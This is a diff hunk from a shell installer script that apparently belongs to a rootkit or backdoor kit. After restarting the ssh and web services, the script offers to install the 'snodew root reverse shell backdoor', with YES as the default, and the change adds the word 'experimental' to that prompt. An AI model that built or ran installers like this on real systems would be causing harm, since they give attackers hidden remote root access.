@@ -424,7 +424,7 @@ echo "Attempting to restart the ssh and apache2/nginx services. You may have to 
 [ -f "/etc/init.d/apache2" ] && { echo "Restarting apache2"; /etc/init.d/apache2 restart &>/dev/null; }
 [ -f "/etc/init.d/nginx" ] && { echo "Restarting nginx"; /etc/init.d/nginx restart &>/dev/null; }
 
-read -p "Installation has finished. Would you like to setup the snodew root reverse shell backdoor? (YES/NO) (case-sensitive) [YES]: "
+read -p "Installation has finished. Would you like to setup the experimental snodew root reverse shell backdoor? (YES/NO) (case-sensitive) [YES]: "
 if [ -z $REPLY ]; then
     install_snodew
 elif [ "$REPLY" == "YES" ]; then
